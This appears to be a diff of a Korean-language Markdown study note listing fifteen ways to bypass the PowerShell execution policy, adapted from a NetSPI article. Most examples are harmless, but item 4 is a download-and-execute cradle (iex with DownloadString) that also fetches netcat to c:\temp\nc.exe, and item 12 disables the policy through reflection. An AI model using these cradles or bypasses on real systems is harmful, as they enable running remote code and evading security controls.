@@ -76,47 +76,109 @@ PS > Set-ExecutionPolicy Restricted -Force
 ```
 Write-Host "Hello World! run me!!!"
 ```
+- `Get-ExecutionPolicy` 명령어로 실행 정책 확인
+    ![003](https://user-images.githubusercontent.com/16396760/50223765-752d3c80-03df-11e9-9c4f-89365eba3494.png)
+- `Restricted` 정책일 경우 PowerShell 스크립트 사용 불가
+    ![002](https://user-images.githubusercontent.com/16396760/50223764-752d3c80-03df-11e9-80e0-9ec3bf400bc2.png)
 
 
 
+1. Paste the Script into an Interactive PowerShell Console
+    ![004](https://user-images.githubusercontent.com/16396760/50223766-75c5d300-03df-11e9-9f0e-bf8f2153b4ed.png)
 
-![002](https://user-images.githubusercontent.com/16396760/50223764-752d3c80-03df-11e9-80e0-9ec3bf400bc2.png)
+2. Echo the Script and Pipe it to PowerShell Standard In
+    ```
+    Echo Write-Host "Hello World! run me!!!"  | PowerShell.exe -noprofile -
+    ```  
+    ![006](https://user-images.githubusercontent.com/16396760/50223768-75c5d300-03df-11e9-8a99-72de6bfb3a45.png)
 
-![003](https://user-images.githubusercontent.com/16396760/50223765-752d3c80-03df-11e9-9c4f-89365eba3494.png)
+3. Read Script from a File and Pipe to PowerShell Standard In
+    ```
+    Get-Content .run.ps1 | PowerShell.exe -noprofile - 
+    ```
+    ![005](https://user-images.githubusercontent.com/16396760/50223767-75c5d300-03df-11e9-8f83-27d1dc04ad28.png)
+    ```
+    TYPE .runme.ps1 | PowerShell.exe -noprofile -
+    ```
+    ![007](https://user-images.githubusercontent.com/16396760/50223769-75c5d300-03df-11e9-8f2b-c01bd19044a7.png)
 
-![004](https://user-images.githubusercontent.com/16396760/50223766-75c5d300-03df-11e9-9f0e-bf8f2153b4ed.png)
+4. Download Script from URL and Execute with Invoke Expression
+    ```
+    powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL주소')"
+    powershell -nop -c "Invoke-Expression(New-Object Net.WebClient).DownloadFile('URL주소', c:\temp\nc.exe)"
+    ```
 
-![005](https://user-images.githubusercontent.com/16396760/50223767-75c5d300-03df-11e9-8f83-27d1dc04ad28.png)
+5. Use the Command Switch
+    ```
+    Powershell -command "Write-Host 'My voice is my passport, verify me.'"
+    ```
+    ![008](https://user-images.githubusercontent.com/16396760/50223770-765e6980-03df-11e9-81dd-c5e9aa859ffc.png)
 
-![006](https://user-images.githubusercontent.com/16396760/50223768-75c5d300-03df-11e9-8a99-72de6bfb3a45.png)
+6. Use the EncodeCommand Switch
+    ```
+    $command = "Write-Host 'My voice is my passport, verify me.'" 
+    $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) 
+    $encodedCommand = [Convert]::ToBase64String($bytes) 
+    powershell.exe -EncodedCommand $encodedCommand
+    ```
+    ![010](https://user-images.githubusercontent.com/16396760/50223772-765e6980-03df-11e9-880b-9e3de9e40b8e.png)
 
-![007](https://user-images.githubusercontent.com/16396760/50223769-75c5d300-03df-11e9-8f2b-c01bd19044a7.png)
+    ![011](https://user-images.githubusercontent.com/16396760/50223773-76f70000-03df-11e9-86a1-2a7af5d44d3b.png)
 
-![008](https://user-images.githubusercontent.com/16396760/50223770-765e6980-03df-11e9-81dd-c5e9aa859ffc.png)
+7. Use the Invoke-Command Command
+    ```
+    invoke-command -scriptblock {Write-Host "My voice is my passport, verify me."}
+    ```
+    ![012](https://user-images.githubusercontent.com/16396760/50223774-76f70000-03df-11e9-8804-f8bc44943a33.png)
 
-![009](https://user-images.githubusercontent.com/16396760/50223771-765e6980-03df-11e9-8ee9-938fcd7a8995.png)
+8. Use the Invoke-Expression Command
+    ![013](https://user-images.githubusercontent.com/16396760/50223775-76f70000-03df-11e9-8b4e-d89850d05b4c.png)
 
-![010](https://user-images.githubusercontent.com/16396760/50223772-765e6980-03df-11e9-880b-9e3de9e40b8e.png)
+    ![014](https://user-images.githubusercontent.com/16396760/50223776-778f9680-03df-11e9-93b2-1f16dcc3cbba.png)
 
-![011](https://user-images.githubusercontent.com/16396760/50223773-76f70000-03df-11e9-86a1-2a7af5d44d3b.png)
+9. Use the “Bypass” Execution Policy Flag
+    ```
+    PowerShell.exe -ExecutionPolicy Bypass -File .run.ps1
+    ```
+    ![015](https://user-images.githubusercontent.com/16396760/50223777-778f9680-03df-11e9-93cf-70c08125dc52.png)
 
-![012](https://user-images.githubusercontent.com/16396760/50223774-76f70000-03df-11e9-8804-f8bc44943a33.png)
+10. Use the “Unrestricted” Execution Policy Flag
+    ```
+    PowerShell.exe -ExecutionPolicy UnRestricted -File .run.ps1
+    ```
+    ![016](https://user-images.githubusercontent.com/16396760/50223779-78282d00-03df-11e9-911b-02ce4f8cd44a.png)
 
-![013](https://user-images.githubusercontent.com/16396760/50223775-76f70000-03df-11e9-8b4e-d89850d05b4c.png)
+11. Use the “Remote-Signed” Execution Policy Flag
+    ```
+    PowerShell.exe -ExecutionPolicy Remote-signed -File .runme.ps1
+    ```
+    
+12. Disable ExecutionPolicy by Swapping out the AuthorizationManager
+    ```
+    PS > function Disable-ExecutionPolicy {($ctx = $executioncontext.gettype().getfield("_context","nonpublic,instance").getvalue( $executioncontext)).gettype().getfield("_authorizationManager","nonpublic,instance").setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager "Microsoft.PowerShell"))}
+    PS > Disable-ExecutionPolicy
+    PS > .\runme.ps1
+    ```
+    ![017](https://user-images.githubusercontent.com/16396760/50223780-78282d00-03df-11e9-91a6-973303e626c2.png)
 
-![014](https://user-images.githubusercontent.com/16396760/50223776-778f9680-03df-11e9-93b2-1f16dcc3cbba.png)
+13. Set the ExcutionPolicy for the Process Scope
+    ![018](https://user-images.githubusercontent.com/16396760/50223781-78282d00-03df-11e9-9508-1bad6439f319.png)
 
-![015](https://user-images.githubusercontent.com/16396760/50223777-778f9680-03df-11e9-93cf-70c08125dc52.png)
+14. Set the ExcutionPolicy for the CurrentUser Scope via Command
+    ```
+    Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
+    ```
+    ![019](https://user-images.githubusercontent.com/16396760/50223782-78282d00-03df-11e9-9cd6-7a19350aaf5c.png)
 
-![016](https://user-images.githubusercontent.com/16396760/50223779-78282d00-03df-11e9-911b-02ce4f8cd44a.png)
+15. Set the ExcutionPolicy for the CurrentUser Scope via the Registry
+    ```
+    HKEY_CURRENT_USER\Software\MicrosoftPowerShell\1\ShellIds\Microsoft.PowerShell
+    ```
+    ![021](https://user-images.githubusercontent.com/16396760/50223784-78c0c380-03df-11e9-8676-246d6810a134.png)
+    ![020](https://user-images.githubusercontent.com/16396760/50223783-78c0c380-03df-11e9-83c4-007639c7203b.png)
 
-![017](https://user-images.githubusercontent.com/16396760/50223780-78282d00-03df-11e9-91a6-973303e626c2.png)
 
-![018](https://user-images.githubusercontent.com/16396760/50223781-78282d00-03df-11e9-9508-1bad6439f319.png)
-
-![019](https://user-images.githubusercontent.com/16396760/50223782-78282d00-03df-11e9-9cd6-7a19350aaf5c.png)
-
-![020](https://user-images.githubusercontent.com/16396760/50223783-78c0c380-03df-11e9-83c4-007639c7203b.png)
-
-![021](https://user-images.githubusercontent.com/16396760/50223784-78c0c380-03df-11e9-8676-246d6810a134.png)
- 
+#### 참조
+ [Microsoft](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-executionpolicy?view=powershell-6)  
+ [NETSPI](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)  
+ [Winaero](https://winaero.com/blog/change-powershell-execution-policy-windows-10/)  
